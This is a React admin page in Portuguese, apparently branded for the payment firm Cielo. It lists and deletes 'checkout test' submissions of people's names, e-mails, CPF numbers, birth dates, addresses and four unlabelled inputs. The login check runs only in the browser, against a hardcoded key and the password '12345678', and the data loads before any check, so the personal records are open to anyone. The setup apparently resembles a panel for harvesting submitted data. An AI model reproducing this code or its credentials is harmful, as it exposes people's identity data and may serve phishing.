import React, { useEffect, useState } from 'react';
import { supabase } from '../lib/supabase';

type CheckoutData = {
  id: number;
  created_at: string;
  nome: string;
  email: string;
  cpf: string;
  nascimento: string;
  cep: string;
  endereco: string;
  input1: string;
  input2: string;
  input3: string;
  input4: string;
};

export default function AdminPage() {
  const [data, setData] = useState<CheckoutData[]>([]);
  const [loading, setLoading] = useState(true);
  const [expandedRow, setExpandedRow] = useState<number | null>(null);
  
  // Login State
  const [isAuthenticated, setIsAuthenticated] = useState(() => {
    return localStorage.getItem('admin_token') === 'cielo_admin_logged';
  });
  const [authKey, setAuthKey] = useState('');
  const [authPass, setAuthPass] = useState('');
  const [authError, setAuthError] = useState(false);

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    if (authKey === 'Ow2Y2GV4tBLDEzMk' && authPass === '12345678') {
      localStorage.setItem('admin_token', 'cielo_admin_logged');
      setIsAuthenticated(true);
      setAuthError(false);
    } else {
      setAuthError(true);
    }
  };

  const handleLogout = () => {
    localStorage.removeItem('admin_token');
    setIsAuthenticated(false);
  };

  const toggleRow = (id: number) => {
    setExpandedRow(expandedRow === id ? null : id);
  };

  const handleDelete = async (id: number) => {
    if (window.confirm('Tem certeza que deseja excluir permanentemente este registro?')) {
      try {
        const { error } = await supabase
          .from('testes_checkout')
          .delete()
          .eq('id', id);

        if (error) throw error;
        
        setData(data.filter(row => row.id !== id));
        if (expandedRow === id) setExpandedRow(null);
      } catch (error) {
        console.error('Erro ao excluir registro:', error);
        alert('Erro ao excluir registro. Tente novamente.');
      }
    }
  };

  useEffect(() => {
    const fetchData = async () => {
      try {
        const { data: testes_checkout, error } = await supabase
          .from('testes_checkout')
          .select('*')
          .order('created_at', { ascending: false });

        if (error) throw error;
        setData(testes_checkout || []);
      } catch (error) {
        console.error('Erro ao buscar dados:', error);
      } finally {
        setLoading(false);
      }
    };

    fetchData();
  }, []);

  if (!isAuthenticated) {
    return (
      <main className="min-h-screen pt-24 pb-16 px-6 bg-surface-container-lowest flex items-center justify-center">
        <div className="w-full max-w-md bg-surface p-8 rounded-2xl border border-outline-variant shadow-lg">
          <div className="flex justify-center mb-6">
            <span className="material-symbols-outlined text-5xl text-primary">lock</span>
          </div>
          <h1 className="text-headline-sm font-headline-sm text-center text-on-surface mb-2">Acesso Restrito</h1>
          <p className="text-body-sm text-center text-secondary mb-8">Insira a chave criptografada para acessar o painel de controle.</p>
          
          <form onSubmit={handleLogin} className="space-y-4">
            <div>
              <label className="block text-label-sm font-label-sm text-on-surface-variant mb-1">Chave de Segurança (Key)</label>
              <input 
                type="text" 
                className="w-full p-3 bg-surface-container-lowest border border-outline-variant rounded-lg focus:border-primary focus:ring-1 focus:ring-primary outline-none"
                value={authKey}
                onChange={(e) => setAuthKey(e.target.value)}
                placeholder="Insira a chave secreta"
                required
              />
            </div>
            <div>
              <label className="block text-label-sm font-label-sm text-on-surface-variant mb-1">Senha (Pass)</label>
              <input 
                type="password" 
                className="w-full p-3 bg-surface-container-lowest border border-outline-variant rounded-lg focus:border-primary focus:ring-1 focus:ring-primary outline-none"
                value={authPass}
                onChange={(e) => setAuthPass(e.target.value)}
                placeholder="Insira sua senha"
                required
              />
            </div>
            {authError && <p className="text-error text-label-sm text-center">Credenciais inválidas. Tente novamente.</p>}
            <button type="submit" className="w-full bg-primary text-on-primary py-3 rounded-lg font-label-md hover:bg-surface-tint transition-colors mt-2">
              Autenticar e Entrar
            </button>
          </form>
        </div>
      </main>
    );
  }

  return (
    <main className="min-h-screen pt-24 pb-16 px-6 bg-surface-container-lowest">
      <div className="max-w-[1200px] mx-auto">
        <header className="mb-8 flex justify-between items-end">
          <div>
            <h1 className="text-headline-md font-headline-md text-on-surface mb-2">Painel de Administração</h1>
            <p className="text-body-md text-secondary">Acompanhe as submissões de formulário dos seus colegas.</p>
          </div>
          <button onClick={handleLogout} className="flex items-center gap-2 text-label-md text-error hover:bg-error/10 px-4 py-2 rounded-lg transition-colors">
            <span className="material-symbols-outlined text-sm">logout</span> Sair
          </button>
        </header>

        <div className="bg-surface border border-outline-variant rounded-xl overflow-hidden shadow-sm">
          {loading ? (
            <div className="p-12 flex justify-center text-secondary">Carregando dados...</div>
          ) : data.length === 0 ? (
            <div className="p-12 text-center flex flex-col items-center">
              <span className="material-symbols-outlined text-4xl text-outline mb-4">dataset</span>
              <p className="text-body-lg text-secondary">Nenhum dado recebido ainda.</p>
              <p className="text-body-sm text-outline mt-2">Envie o link para seus colegas fazerem o teste de checkout!</p>
            </div>
          ) : (
            <div className="overflow-x-auto">
              <table className="w-full text-left border-collapse">
                <thead>
                  <tr className="bg-surface-container-low text-label-md text-secondary uppercase border-b border-outline-variant">
                    <th className="p-4 w-12"></th>
                    <th className="p-4 font-semibold">ID</th>
                    <th className="p-4 font-semibold">Data e Hora</th>
                    <th className="p-4 font-semibold">Input 1</th>
                    <th className="p-4 font-semibold">Input 2</th>
                    <th className="p-4 font-semibold">Input 3</th>
                    <th className="p-4 font-semibold">Input 4</th>
                  </tr>
                </thead>
                <tbody>
                  {data.map((row) => (
                    <React.Fragment key={row.id}>
                      <tr 
                        className={`border-b border-outline-variant hover:bg-surface-container-lowest transition-colors cursor-pointer ${expandedRow === row.id ? 'bg-surface-container-lowest' : ''}`}
                        onClick={() => toggleRow(row.id)}
                      >
                        <td className="p-4 text-secondary">
                          <span className={`material-symbols-outlined transition-transform ${expandedRow === row.id ? 'rotate-180' : ''}`}>
                            keyboard_arrow_down
                          </span>
                        </td>
                        <td className="p-4 text-body-sm text-secondary font-mono">{row.id}</td>
                        <td className="p-4 text-body-sm text-on-surface">
                          {new Date(row.created_at).toLocaleString('pt-BR')}
                        </td>
                        <td className="p-4 text-body-md font-medium text-primary">{row.input1}</td>
                        <td className="p-4 text-body-md text-on-surface">{row.input2}</td>
                        <td className="p-4 text-body-md text-on-surface">{row.input3}</td>
                        <td className="p-4 text-body-md text-on-surface">{row.input4}</td>
                      </tr>
                      {expandedRow === row.id && (
                        <tr className="bg-surface-container-lowest border-b border-outline-variant">
                          <td colSpan={7} className="p-6">
                            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 bg-surface p-6 rounded-xl border border-outline-variant shadow-sm">
                              <div>
                                <p className="text-caption text-secondary uppercase tracking-wider mb-1">Nome Completo</p>
                                <p className="text-body-md font-medium text-on-surface">{row.nome || 'Não informado'}</p>
                              </div>
                              <div>
                                <p className="text-caption text-secondary uppercase tracking-wider mb-1">E-mail</p>
                                <p className="text-body-md font-medium text-on-surface">{row.email || 'Não informado'}</p>
                              </div>
                              <div>
                                <p className="text-caption text-secondary uppercase tracking-wider mb-1">CPF</p>
                                <p className="text-body-md font-medium text-on-surface">{row.cpf || 'Não informado'}</p>
                              </div>
                              <div>
                                <p className="text-caption text-secondary uppercase tracking-wider mb-1">Data de Nascimento</p>
                                <p className="text-body-md font-medium text-on-surface">{row.nascimento ? new Date(row.nascimento).toLocaleDateString('pt-BR', { timeZone: 'UTC' }) : 'Não informado'}</p>
                              </div>
                              <div>
                                <p className="text-caption text-secondary uppercase tracking-wider mb-1">CEP</p>
                                <p className="text-body-md font-medium text-on-surface">{row.cep || 'Não informado'}</p>
                              </div>
                              <div className="md:col-span-2 lg:col-span-1">
                                <p className="text-caption text-secondary uppercase tracking-wider mb-1">Endereço Completo</p>
                                <p className="text-body-md font-medium text-on-surface">{row.endereco || 'Não informado'}</p>
                              </div>
                              <div className="md:col-span-2 lg:col-span-3 flex justify-end mt-2 pt-4 border-t border-outline-variant">
                                <button 
                                  onClick={(e) => {
                                    e.stopPropagation();
                                    handleDelete(row.id);
                                  }}
                                  className="flex items-center gap-2 bg-rose-50 text-rose-600 hover:bg-rose-600 hover:text-white px-5 py-2 rounded-lg transition-all duration-300 font-bold text-sm border border-rose-100 hover:border-transparent shadow-sm"
                                >
                                  <span className="material-symbols-outlined text-[18px]">delete</span>
                                  Excluir Dados
                                </button>
                              </div>
                            </div>
                          </td>
                        </tr>
                      )}
                    </React.Fragment>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </div>
      </div>
    </main>
  );
}
